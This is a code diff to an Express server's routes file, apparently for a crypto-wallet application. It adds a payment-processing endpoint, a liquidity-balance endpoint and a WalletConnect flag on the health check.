@@ -143,12 +143,56 @@ export async function registerRoutes(app: Express): Promise<Server> {
     }
   });
 
+  // Payment processing endpoint
+  app.post("/api/payment/process", async (req, res) => {
+    try {
+      const { amount, token } = req.body;
+      
+      if (!amount || isNaN(parseFloat(amount))) {
+        return res.status(400).json({ error: "Invalid payment amount" });
+      }
+
+      const success = await walletService.processPayment({
+        recipientAddress: walletService.getPaymentWallet(),
+        amount,
+        token
+      });
+
+      if (success) {
+        res.json({ 
+          success: true, 
+          message: "Payment processed successfully",
+          recipient: "Payment wallet (hidden for security)"
+        });
+      } else {
+        res.status(500).json({ error: "Payment processing failed" });
+      }
+    } catch (error) {
+      res.status(500).json({ error: "Payment processing error" });
+    }
+  });
+
+  // Get liquidity data endpoint
+  app.get("/api/liquidity", async (req, res) => {
+    try {
+      const balance = await walletService.getLiquidityBalance();
+      res.json({ 
+        balance,
+        wallet: walletService.getLiquidityWallet(),
+        timestamp: new Date().toISOString()
+      });
+    } catch (error) {
+      res.status(500).json({ error: "Failed to fetch liquidity data" });
+    }
+  });
+
   // Health check endpoint
   app.get("/api/health", (req, res) => {
     res.json({ 
       status: "healthy", 
       timestamp: new Date().toISOString(),
-      bot: "active"
+      bot: "active",
+      walletconnect: "enabled"
     });
   });
 
